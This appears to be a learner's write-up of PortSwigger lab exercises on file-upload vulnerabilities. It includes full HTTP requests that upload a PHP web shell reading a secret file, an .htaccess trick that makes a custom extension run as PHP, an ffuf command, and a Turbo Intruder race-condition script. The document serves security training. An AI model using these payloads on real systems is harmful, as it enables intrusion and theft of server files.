# File Upload Vulnerabilities

## Labs

### Web shell upload via extension blacklist bypass

I've managed to bypass the filter using the following request:

```http
POST /my-account/avatar HTTP/1.1
Host: acb81f8f1f4f4a46c0cc39f500b8009e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acb81f8f1f4f4a46c0cc39f500b8009e.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=---------------------------10948141071551870154239192795
Content-Length: 543
Origin: https://acb81f8f1f4f4a46c0cc39f500b8009e.web-security-academy.net
Connection: close
Cookie: session=ezbQkyPLqeumwtiE4uhIAtfn4AWdbteP
Upgrade-Insecure-Requests: 1

-----------------------------10948141071551870154239192795
Content-Disposition: form-data; name="avatar"; filename="file.phtml"
Content-Type: application/php

<?php

echo file_get_contents("/home/carlos/secret");
?>

-----------------------------10948141071551870154239192795
Content-Disposition: form-data; name="user"

wiener
-----------------------------10948141071551870154239192795
Content-Disposition: form-data; name="csrf"

ugnxF5DmoOWX4Ma9VaBUGMWH1nwgmJ4Z
-----------------------------10948141071551870154239192795--

```

Although, this is not the intended way of completing the lab.

According to the solution provided by PortSwigger, you should upload a file named `.htaccess`, with mimetype set to `text/plain` and containing the following contents:

```text
AddType application/x-httpd-php .l33t
```

This maps the extension `.l33t` to the mimetype `application/x-httpd-php`. Similarly, I mapped the aforementioned mimetype to the extension `.rbct`:

```http
POST /my-account/avatar HTTP/1.1
Host: ac641f7a1fe12da9c01426b200c20034.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac641f7a1fe12da9c01426b200c20034.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=---------------------------1505121776641287142092914676
Content-Length: 511
Origin: https://ac641f7a1fe12da9c01426b200c20034.web-security-academy.net
Connection: close
Cookie: session=MU4mIS5SYZy6lSzRWDlkL1TRz7ba4gFF
Upgrade-Insecure-Requests: 1

-----------------------------1505121776641287142092914676
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .rbct

-----------------------------1505121776641287142092914676
Content-Disposition: form-data; name="user"

wiener
-----------------------------1505121776641287142092914676
Content-Disposition: form-data; name="csrf"

L2CXHwOeTnzjf6JXRlD6kKxqmw2sIoMv
-----------------------------1505121776641287142092914676--

```

After that I could upload a file ending with `.rbct` in order to execute PHP code.

### aa

To solve the lab I've used `ffuf`:

```bash
ffuf -u 'https://ac231fd81f7c228fc0620a7300260049.web-security-academy.net/files/avatars/image.php' \
    -or -of html -od output_dir
    -v -noninteractive -rate 10 \
    -H "X-Custom-Header-rbct: FUZZ"
    -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
```

At the same time, I sent a few requests using `Repeater`:

```http
POST /my-account/avatar HTTP/1.1
Host: ac231fd81f7c228fc0620a7300260049.web-security-academy.net
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: session=8kNOuG2xjdQQkSGhxXP4f6S83PxthX9Y
Content-Length: 443
Content-Type: multipart/form-data; boundary=9ad4459fe1d5934f0934fb92668b76e4

--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="user"

wiener
--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="csrf"

h5nZ4DWK8d6N6L6F66VAfvAiQyxvR7cK
--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="avatar"; filename="image.php"
Content-Type: application/php

<?php
echo file_get_contents("/home/carlos/secret");
?>
--9ad4459fe1d5934f0934fb92668b76e4--

```

According to the official solution, you can use `Turbo Intruder`:

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    request1 = '''POST /my-account/avatar HTTP/1.1
Host: ac231fd81f7c228fc0620a7300260049.web-security-academy.net
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: session=8kNOuG2xjdQQkSGhxXP4f6S83PxthX9Y
Content-Length: 443
Content-Type: multipart/form-data; boundary=9ad4459fe1d5934f0934fb92668b76e4

--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="user"

wiener
--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="csrf"

h5nZ4DWK8d6N6L6F66VAfvAiQyxvR7cK
--9ad4459fe1d5934f0934fb92668b76e4
Content-Disposition: form-data; name="avatar"; filename="image.php"
Content-Type: application/php

<?php
echo file_get_contents("/home/carlos/secret");
?>
--9ad4459fe1d5934f0934fb92668b76e4--

'''

    request2 = '''GET /files/avatars/image.php HTTP/1.1
Host: ac231fd81f7c228fc0620a7300260049.web-security-academy.net
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: session=MuPdm2HGYmLqYLKBjM1gy9zsZqy8JcDf


'''

    engine.queue(request1, gate='race1')
    
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Although it took me a few attempts, I've managed to get a successful response.
